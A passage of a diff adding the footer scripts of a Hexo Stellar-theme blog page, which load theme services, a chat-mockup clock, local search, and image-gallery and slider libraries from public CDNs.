+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
